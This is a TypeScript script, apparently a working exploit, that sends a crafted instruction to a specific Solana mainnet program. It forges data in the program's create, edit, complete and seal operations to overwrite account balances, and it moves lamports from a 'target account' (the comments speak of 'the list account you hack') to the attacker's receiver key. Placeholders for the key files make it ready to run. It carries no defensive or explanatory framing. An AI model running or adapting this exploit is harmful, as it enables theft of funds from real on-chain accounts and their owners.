
import { clusterApiUrl, Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, sendAndConfirmTransaction, SystemProgram, Transaction, TransactionInstruction } from "@solana/web3.js";
import * as fs from "fs";
import * as web3 from "@solana/web3.js";

async function main() {
    
    const secret = JSON.parse(fs.readFileSync("{TODO:yourSignerKey}.json").toString()) as number[]
    const secretKey = Uint8Array.from(secret)
    const ownerKeypair = Keypair.fromSecretKey(secretKey)

    const funzsec = JSON.parse(fs.readFileSync("{TODO:yourReceiverKey}.json").toString()) as number[]
    const funzKey = Keypair.fromSecretKey(Uint8Array.from(funzsec))

    const listKey = new Keypair();//Keypair.fromSecretKey(Uint8Array.from(lsec))

    const publicKey = ownerKeypair.publicKey;
    console.log(publicKey.toBase58());

    const transaction = new Transaction()

    const connection = new Connection("https://api.mainnet-beta.solana.com");


    const programId = new PublicKey("DTXRUWcdYCAKbjvhpd9ztAUoMENrzztQkSoiJcFtR7dw");


    const createIX = SystemProgram.createAccount({
        fromPubkey: ownerKeypair.publicKey,
        newAccountPubkey: listKey.publicKey,
        lamports: 0.0011136*LAMPORTS_PER_SOL,
        space: 32,
        programId
    })
    
    const bufferSize = 200;
    const instructionData : Buffer = Buffer.alloc(bufferSize);

    let offset = 0;
    instructionData.write("92914dba42a93ee7", "hex")
    offset += 8;
    instructionData.writeUint32LE(bufferSize-8-4, offset); // entire instruction data vector<u8> length
    offset += 4;
    instructionData.writeUint32LE(6, offset); // number of operations
    offset += 4;
    // first operation: create
    instructionData.writeUInt8(0, offset); // enum CREATE
    offset += 1;
    // second operation: edit
    instructionData.writeUInt8(1, offset); // enum EDIT
    offset += 1;
    const mylen = 8;
    instructionData.writeBigInt64LE(BigInt(20768+8), offset); // new size of edit
    //instructionData.write("00e1f50500000000", offset, "hex");
    offset += 8;
    // third operation: complete
    instructionData.writeUInt8(2, offset); // enum COMPLETE
    offset += 1;
    instructionData.writeBigInt64LE(BigInt(10392), offset); // offset 21024
    offset += 8;
    instructionData.writeUInt32LE(mylen, offset); // data: Vec<u8> length
    offset += 4;
    //instructionData.write("Andy was here", offset, "utf-8"); // data
    const currentBalance = 99995000 // TODO change to lamports on your receiver address
    const targetBalance = 300000000 // TODO change to lamports on the list account you hack
    instructionData.writeBigUInt64LE(BigInt(targetBalance+currentBalance), offset);
    offset += mylen;

    
    // another complete instruction 
    instructionData.writeUInt8(2, offset); // enum COMPLETE
    offset += 1;
    instructionData.writeBigInt64LE(BigInt(20728), offset); // offset 
    offset += 8;
    instructionData.writeUInt32LE(mylen, offset); // data: Vec<u8> length
    offset += 4;
    //instructionData.write("Andy was here", offset, "utf-8"); // data
    instructionData.writeBigUInt64LE(BigInt(0), offset);
    offset += mylen;
    
    // another edit
    instructionData.writeUInt8(1, offset); // enum EDIT
    offset += 1;
    instructionData.writeBigInt64LE(BigInt(32), offset); // new size of edit
    offset += 8;
    // fourth operation: seal
    instructionData.writeUInt8(3, offset); // enum SEAL
    offset += 1;

    console.log(offset);


    const target = new PublicKey("Hye1Kef1LLDuesGqSm7Kj5ctbUBDoCLAL4pMEL1fwgy5"); // TODO change to target account

    console.log(instructionData)
    const programInstruction = new TransactionInstruction({
        keys: [
            {
                pubkey: ownerKeypair.publicKey,
                isSigner: true,
                isWritable: true
            },
            {
                pubkey: listKey.publicKey,
                isSigner: false,
                isWritable: true
            },
            {
                pubkey: listKey.publicKey,
                isSigner: false,
                isWritable: true
            },
            {
                pubkey: listKey.publicKey,
                isSigner: false,
                isWritable: true
            },
            {
                pubkey: listKey.publicKey,
                isSigner: false,
                isWritable: true
            },
            {
                pubkey: listKey.publicKey,
                isSigner: false,
                isWritable: true
            },
            {
                pubkey: listKey.publicKey,
                isSigner: false,
                isWritable: true
            },
            {
                pubkey: funzKey.publicKey,
                isSigner: false,
                isWritable: true
            },
            {
                pubkey: target,
                isSigner: false,
                isWritable: true
            },
        ],
        programId,
        data: instructionData
    });
    transaction.add(createIX);
    transaction.add(programInstruction);
    

    const signature = await sendAndConfirmTransaction(
        connection,
        transaction,
        [ownerKeypair, listKey]
    )
    console.log(signature);

    

}

main();
